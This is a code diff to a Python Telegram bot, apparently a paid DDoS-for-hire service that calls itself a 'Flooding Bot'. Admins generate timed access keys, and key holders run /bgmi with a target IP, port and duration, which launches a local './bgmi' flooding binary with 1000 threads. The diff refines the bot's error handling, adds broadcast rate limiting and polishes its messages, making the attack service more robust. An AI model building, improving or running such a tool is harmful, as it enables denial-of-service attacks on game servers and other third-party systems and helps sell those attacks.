@@ -4,6 +4,7 @@ import os
 import random
 import string
 import datetime
+import asyncio
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
@@ -11,12 +12,11 @@ from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 USER_FILE = "users.json"
 KEY_FILE = "keys.json"
 
-flooding_process = None
-flooding_command = None
-
+# Default Attack Parameters
 DEFAULT_THREADS = 1000
 DEFAULT_PACKET = 9
 
+# Load Data on Start
 users = {}
 keys = {}
 
@@ -29,10 +29,7 @@ def load_users():
     try:
         with open(USER_FILE, "r") as file:
             return json.load(file)
-    except FileNotFoundError:
-        return {}
-    except Exception as e:
-        print(f"Error loading users: {e}")
+    except (FileNotFoundError, json.JSONDecodeError):
         return {}
 
 def save_users():
@@ -43,10 +40,7 @@ def load_keys():
     try:
         with open(KEY_FILE, "r") as file:
             return json.load(file)
-    except FileNotFoundError:
-        return {}
-    except Exception as e:
-        print(f"Error loading keys: {e}")
+    except (FileNotFoundError, json.JSONDecodeError):
         return {}
 
 def save_keys():
@@ -54,13 +48,19 @@ def save_keys():
         json.dump(keys, file)
 
 def generate_key(length=6):
-    characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
 
 def add_time_to_current_date(hours=0, days=0):
     return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
 
-# Command to generate keys
+async def safe_send_message(update: Update, text: str):
+    """Safely send messages and handle errors."""
+    try:
+        await update.message.reply_text(text)
+    except Exception as e:
+        print(f"Error sending message: {e}")
+
+# Generate Key Command (Admin Only)
 async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     if user_id in ADMIN_IDS:
@@ -69,26 +69,21 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             try:
                 time_amount = int(command[0])
                 time_unit = command[1].lower()
-                if time_unit == 'hours':
-                    expiration_date = add_time_to_current_date(hours=time_amount)
-                elif time_unit == 'days':
-                    expiration_date = add_time_to_current_date(days=time_amount)
-                else:
-                    raise ValueError("Invalid time unit")
+                expiration_date = add_time_to_current_date(**{time_unit: time_amount})
                 key = generate_key()
                 keys[key] = expiration_date
                 save_keys()
-                response = f"Key generated: {key}\nExpires on: {expiration_date}"
+                response = f"✅ Key generated: `{key}`\n🔹 Expires on: {expiration_date}"
             except ValueError:
-                response = "Please specify a valid number and unit of time (hours/days) "
+                response = "❌ Invalid time format. Use: `/genkey <amount> <hours/days>`"
         else:
-            response = "Usage: /genkey <amount> <hours/days>"
+            response = "Usage: `/genkey <amount> <hours/days>`"
     else:
-        response = "ONLY OWNER CAN USE💀OWNER @..."
+        response = "⚠️ ONLY OWNER CAN USE THIS COMMAND."
+    
+    await safe_send_message(update, response)
 
-    await update.message.reply_text(response)
-
-
+# Redeem Key Command
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     command = context.args
@@ -105,92 +100,96 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_users()
             del keys[key]
             save_keys()
-            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @"
+            response = f"✅ Key redeemed successfully! Access granted until: {users[user_id]}"
         else:
-            response = "Invalid or expired key buy from @"
+            response = "❌ Invalid or expired key. Buy a key from @OWNER_USERNAME"
     else:
-        response = "Usage: /redeem <key>"
+        response = "Usage: `/redeem <key>`"
 
-    await update.message.reply_text(response)
+    await safe_send_message(update, response)
 
-
+# List All Users (Admin Only)
 async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     if user_id in ADMIN_IDS:
+        response = "📋 **Authorized Users:**\n"
         if users:
-            response = "Authorized Users:\n"
-            for user_id, expiration_date in users.items():
+            for uid, expiration_date in users.items():
                 try:
-                    user_info = await context.bot.get_chat(int(user_id))
-                    username = user_info.username if user_info.username else f"UserID: {user_id}"
-                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
+                    user_info = await context.bot.get_chat(int(uid))
+                    username = user_info.username if user_info.username else f"UserID: {uid}"
+                    response += f"- @{username} (ID: {uid}) expires on {expiration_date}\n"
                 except Exception:
-                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
+                    response += f"- User ID: {uid} expires on {expiration_date}\n"
         else:
-            response = "No data found"
+            response = "⚠️ No users found."
     else:
-        response = "ONLY OWNER CAN USE."
-    await update.message.reply_text(response)
+        response = "⚠️ ONLY OWNER CAN USE THIS COMMAND."
 
+    await safe_send_message(update, response)
 
+# BGMI Attack Command (Restricted Access)
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    global flooding_command, flooding_process
     user_id = str(update.message.from_user.id)
 
+    # Check if user has access
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @")
+        await safe_send_message(update, "❌ Access expired or unauthorized. Buy a key from @OWNER_USERNAME")
         return
 
     if len(context.args) != 4:
-        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration> <sid>')
+        await safe_send_message(update, "Usage: `/bgmi <target_ip> <port> <duration> <sid>`")
         return
 
-    target_ip = context.args[0]
-    port = context.args[1]
-    duration = context.args[2]
-    packet = context.args[3]
+    target_ip, port, duration, packet = context.args
+    attack_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
+    
+    try:
+        subprocess.Popen(attack_command)
+        await safe_send_message(update, f"🚀 **Attack Started** on `{target_ip}:{port}` for {duration} seconds.")
+    except Exception as e:
+        await safe_send_message(update, f"❌ Failed to start attack: {e}")
 
-    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
-    # Start attack automatically after setting parameters
-    flooding_process = subprocess.Popen(flooding_command)
-    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {duration} seconds with 400 threads.OWMER- @.')
-
-
+# Broadcast Message (Admin Only)
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     if user_id in ADMIN_IDS:
         message = ' '.join(context.args)
         if not message:
-            await update.message.reply_text('Usage: /broadcast <message>')
+            await safe_send_message(update, "Usage: `/broadcast <message>`")
             return
 
         for user in users.keys():
             try:
                 await context.bot.send_message(chat_id=int(user), text=message)
+                await asyncio.sleep(0.5)  # Prevent rate limits
             except Exception as e:
                 print(f"Error sending message to {user}: {e}")
-        response = "Message sent to all users."
+
+        response = "📢 Message sent to all users."
     else:
-        response = "ONLY OWNER CAN USE."
+        response = "⚠️ ONLY OWNER CAN USE THIS COMMAND."
     
-    await update.message.reply_text(response)
+    await safe_send_message(update, response)
 
-
+# Help Command
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     response = (
-        "Welcome to the Flooding Bot by @{OWNER_USERNAME}..! Here are the available commands:\n\n"
-        "Admin Commands:\n"
-        "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"
-        "/allusers - Show all authorized users.\n"
-        "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
-        "User Commands:\n"
-        "/redeem <key> - Redeem a key to gain access.\n"
-        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters and start attack.\n"
+        "**🤖 Welcome to the Flooding Bot**\n"
+        f"🔹 **Owner:** @{OWNER_USERNAME}\n\n"
+        "**🔑 Admin Commands:**\n"
+        "🛠 `/genkey <amount> <hours/days>` - Generate an access key.\n"
+        "📜 `/allusers` - Show all authorized users.\n"
+        "📢 `/broadcast <message>` - Send a message to all users.\n\n"
+        "**🚀 User Commands:**\n"
+        "🔑 `/redeem <key>` - Redeem a key for access.\n"
+        "🔥 `/bgmi <target_ip> <port> <duration>` - Start attack.\n"
     )
-    await update.message.reply_text(response)
+    await safe_send_message(update, response)
 
+# Main Function
 def main() -> None:
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
+    application = ApplicationBuilder().token(BOT_TOKEN).read_timeout(30).write_timeout(30).build()
 
     application.add_handler(CommandHandler("genkey", genkey))
     application.add_handler(CommandHandler("redeem", redeem))
